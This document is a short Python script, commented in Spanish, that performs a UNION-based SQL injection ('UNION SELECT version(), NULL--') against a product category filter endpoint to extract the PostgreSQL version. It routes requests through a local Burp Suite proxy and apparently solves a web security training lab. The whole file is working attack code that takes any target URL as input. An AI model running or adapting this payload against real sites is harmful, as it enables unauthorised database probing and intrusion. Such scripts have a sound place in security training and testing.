import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configura el proxy Burp Suite
proxyjp = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def Obtener_motor_o_version_bd(url):
    ruta = "filter?category=Pets"
    payload_motor_bd = "' UNION SELECT version(), NULL--"
    # Utiliza el proxy al hacer la solicitud
    solicitud_motor_bd = requests.get(url + ruta + payload_motor_bd, verify=False, proxies=proxyjp)
    respuesta_motor_bd = solicitud_motor_bd.text
    # Busca la cadena "PostgreSQL" seguida de la versión en la respuesta
    match_version = re.search(r'PostgreSQL \d+(\.\d+)*', respuesta_motor_bd)
    if match_version:
        version = match_version.group(0)
        print("[+] Se encontró la versión de PostgreSQL:", version)
        # Separa las filas de la respuesta
        filas = respuesta_motor_bd.split('\n')
        # Itera sobre las filas para encontrar y mostrar la fila que contiene la versión de PostgreSQL
        for fila in filas:
            if version in fila:
                print("[+] Fila completa con la versión de PostgreSQL:")
                print(fila.strip())  # Elimina espacios en blanco alrededor de la fila
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Uso: %s <url>" % sys.argv[0])
        print("[-] Ejemplo: %s <https://paganaxyz.com>" % sys.argv[0])
        sys.exit(-1)
    print("[+] Obteniendo motor bd")
    # Llama a la función con la URL como parámetro
    if not Obtener_motor_o_version_bd(url):
        print("[-] No se pudo obtener el motor de bd")
